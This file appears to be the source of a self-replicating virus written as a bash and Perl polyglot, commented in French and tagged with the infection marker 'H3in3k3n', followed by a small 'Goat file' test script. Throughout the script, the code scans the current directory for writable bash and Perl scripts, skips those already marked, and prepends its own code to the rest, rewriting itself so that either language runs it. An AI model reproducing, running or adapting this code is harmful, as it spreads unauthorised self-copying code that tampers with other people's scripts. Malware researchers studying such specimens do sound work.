#!/bin/bash						#parti bash
#H3in3k3n						#marque d'infection
for fichier in *					#recherche de fichier
do
  if [ -f $fichier -a -w $fichier ];then		#teste si fichier et vérifie les droits
      if file $fichier | grep Bourne-A > /dev/null	#teste si c'est un fichier BASH
       then
           head -n 2 $fichier  > .a
           if grep H3in3k3n .a > /dev/null		#teste si déjà infecté
           then
               rm -f .a
           else
               cat $fichier > .a			#sauvegarde le script original dans .a
               head -n 62 $0 > $fichier		#recopie le virus dans le fichier
		cat .a >> $fichier			#recopie le script original a la suite
               rm -f .a
           fi;fi
      if file $fichier | grep perl > /dev/null		#teste si fichier perl
      then
	   head -n 2 $fichier  > .a
           if grep H3in3k3n .a > /dev/null		#teste si infecté
           then
               	rm -f .a
           else
		cat $fichier > .a
		awk '{ if ((NR>=34)&&(NR<=62)) print $0 }' $0 > .b
		cut -b 2- .b > $fichier			#décommente les lignes 34 à 62, écrit dans le fichier
		head -n 32 $0 > .b
		sed -e 's/^/#/' .b >> $fichier		#commente la parti bash et la copi à la suite
		cat .a >> $fichier			#ecrit le script orignal en suivant
		rm -f .a .b
fi;fi;fi
done
##!/usr/bin/perl						#parti perl
##H3in3k3n						#marque d'infection
#open(File,$0);
#@vx=<File>;						#place le virus dans la table @vx
#close(File);
#foreach $Fichier (<*>){					#recherche les fichiers
#  if ((-f $Fichier) && (-r $Fichier) && (-w $Fichier)){ #test si fichier et vérifie les droits
#    open(File, "$Fichier");
#    @Temp=<File>;					#sauvegarde le contenu du fichier dans @Temp
#    close(File);
#    if (@Temp[0] =~ "/perl"){				#teste si c'est un fichier perl
#      if (@Temp[1] ne "\#H3in3k3n\n"){			#teste si déjà infecté
#        open(File, ">$Fichier");
#        print File @vx[0 .. 61];			#écrit le virus
#        print File @Temp;				#récrit le script original
#        close (File);}}
#    if (@Temp[0] =~ "/bash"){				#si c'est un shell script
#      if (@Temp[1] ne "\#H3in3k3n\n"){
#        for (0 .. 28 ){
#	  @vx2[$_] = "\#" . @vx[$_];}			#commente les 29 premières lignes, résultat dans @vx2
#	for (29 .. 61){
#	  @vx1[$_]= @vx[$_];
#	  @vx1[$_]=~ s/#//;}				#décommente les lignes 30 à 62, résultat dans @vx1
#	open(File, ">$Fichier");
#        print File @vx1;				#écrit la parti shell script
#	print File @vx2;				#écrit la parti perl script commenté
#	print File @Temp;				#récrit le script original
#	close(File);
#}}}}
#! /bin/bash
#1 Goat file
#2 Goat file
#3 Goat file
echo "Goat file"	#4
#5 Goat file
#6 Goat file
#7 Goat file EOF
